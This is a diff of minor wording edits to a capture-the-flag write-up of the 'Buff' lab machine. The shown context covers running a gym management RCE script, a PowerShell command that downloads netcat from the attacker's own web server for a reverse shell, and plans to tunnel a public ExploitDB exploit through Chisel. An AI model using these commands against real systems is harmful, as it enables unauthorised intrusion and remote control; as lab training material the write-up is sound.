@@ -62,7 +62,7 @@ Interesting. Looking through the Python code, this should be good to just point 
 ### Exploitation
 
 
-I execute the exploit at the target using:
+I execute the exploit using:
 
 `python2 gym-mgmt-system-rce.py http://10.10.10.198:8080/` 
 
@@ -76,7 +76,7 @@ The foothold was a breeze. After firing the script I'm presented with a web-shel
 
 This web-shell is not the best to work out of, so I'm going to create a reverse shell from the web-shell back to my machine, so I can enumerate more comfortably.
 
-To do this I'll need to transfer a netcat executable to the target machine. First I'll set up a python webserver and on the target box fetch netcat with 
+To do this I'll need to transfer a netcat executable to the target machine. First I'll set up a Python webserver and on the target box fetch netcat with:
 
 ```text
 powershell -c iwr http://10.10.14.28/nc.exe -outfile nc.exe"
@@ -98,7 +98,7 @@ Browsing around the machine, I find and interesting executable in Shaun's Downlo
 
 It also looks like the version number is being listed as well. Turning to ExploitDB to see if I can find any public exploits, I quickly find this one: https://www.exploit-db.com/exploits/48389. This is a Python script, which should be pretty straightforward to execute. 
 
-But there is one small hurdle we'll have to get through first. Because this is exploit is written in python, and python is not normally installed on Windows machines, we'll need to use a tool like Chisel to tunnel from my machine to the victim.
+But there is one small hurdle we'll have to get through first. Because this is exploit is written in Python, and Python is not normally installed on Windows machines, we'll need to use a tool like Chisel to tunnel from my machine to the target.
 
 So, lets get the exploit cleaned up and ready to execute and then transfer over Chisel to set up a tunnel.
 
@@ -164,7 +164,7 @@ Next, lets use Chisel to set up a tunnel between our machine and the target:
 
 ### Chisel
 
-Chisel is my favorite tool for situations like this, because it can be used on both Windows and Linux machines, doesn't require SSH access, and is incredibly straight forward.
+Chisel is my favorite tool for situations like this, because it can be used on both Windows and Linux machines, doesn't require SSH access, and is incredibly straight forward. https://github.com/jpillora/chisel
 
 First things first I need to copy Chisel over to the Buff machine. To do this I'll use the same PowerShell one-liner I used to transfer over netcat:
 
